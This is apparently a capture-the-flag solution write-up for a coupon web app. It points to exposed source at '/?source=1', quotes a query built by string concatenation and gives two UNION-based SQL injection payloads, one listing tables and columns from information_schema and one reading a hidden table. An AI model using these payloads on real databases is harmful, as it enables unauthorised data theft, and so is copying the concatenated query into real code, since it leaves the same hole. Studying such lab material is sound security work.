## SOLUTION 

You can see python code by accessing `/?source=1`

Vulnerable piece of code:
```python
mycursor.execute("SELECT * FROM coupons WHERE code = '" + str(form['cid']) + "'")
```

1. SQL: 
```sql
' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND ''='
```

2. SQL: 
```sql
' UNION SELECT 1,ZGVmaW5pdGVseS1ub3QtZmxhZw,2 FROM c2VjcmV0LWRi WHERE ''='
```